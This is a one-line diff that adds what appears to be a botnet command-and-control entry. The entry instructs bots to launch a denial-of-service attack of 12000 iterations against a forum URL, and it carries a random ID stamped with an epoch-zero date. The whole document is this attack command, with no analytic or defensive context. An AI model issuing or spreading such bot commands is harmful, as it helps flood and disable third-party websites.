@@ -1,0 +1,1 @@
+<INPUTCOMMAND>DDOS[I=12000][P=http://1337crew.in/smf/index.php?action=]  <RAND31.12.1969483084>ID:31.12.1969483084<br>
